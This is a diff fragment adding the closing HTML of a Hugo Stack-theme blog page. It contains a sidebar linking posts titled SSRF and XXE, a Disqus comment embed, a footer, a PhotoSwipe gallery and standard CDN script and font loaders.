+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/ssrf/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">SSRF</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/xxe/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">XXE</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <div class="disqus-container">
+    <div id="disqus_thread"></div>
+<script>
+    window.disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "hugo-theme-stack" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+
+<style>
+    .disqus-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+    }
+</style>
+
+<script>
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (typeof DISQUS == 'object') {
+            DISQUS.reset({
+                reload: true
+            });
+        }
+    })
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2025 liernian
+    </section>
+    
+    <section class="powerby">
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.59729e8016d63fb571847b33800c7f0e48c9acdb8eaed3eec3e94d3bcad55aca.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
